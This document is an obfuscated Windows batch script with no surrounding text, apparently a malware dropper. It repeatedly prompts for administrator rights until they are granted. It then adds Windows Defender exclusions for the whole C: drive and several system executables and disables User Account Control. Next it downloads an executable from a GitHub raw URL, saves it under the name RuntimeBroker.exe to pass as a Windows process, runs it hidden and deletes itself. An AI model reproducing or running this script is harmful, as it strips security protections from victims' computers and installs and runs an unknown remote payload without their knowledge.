@echo off & setlocal enableDelayedExpansion
set "aVn=>nul" & set "OLxB=SESSION" & set "hqEu=2>&1" & set "NYVb=NET"
%NYVb% %OLxB% %aVn% %hqEu%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "QUKAX=bar" & set "BHFL=qux" & set "ASJ=foo" & set "izK=baz" & rem jrPEI eAfHky mXZteW
set "WlCc=powershell -ExecutionPolicy Bypass -Command"
set "Atbj=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "jmE='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "DRpV='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!WlCc! "!Atbj! !jmE! !DRpV!" %aVn% %hqEu%
set "iZGD=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "pDK=-Name 'EnableLUA' -Value 0"
!WlCc! "!iZGD! !pDK!" %aVn% %hqEu%
set "aYw=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!WlCc! "!aYw!" %aVn% %hqEu%
if !errorlevel! neq 0 (goto %a%)
set "SCm=timeout /t" & !SCm! 2 %aVn% %hqEu%
set "KgyGJ=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "NFK=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "meKQ=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!WlCc! "!KgyGJ! !NFK! !meKQ!" %aVn% %hqEu%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!SCm! 1 %aVn% %hqEu% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %aVn% %hqEu%
del /f /q "%~f0" %aVn% %hqEu%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %aVn% %hqEu%
if !errorlevel! neq 0 (!SCm! 3 %aVn% %hqEu% & goto %b%)
exit /b
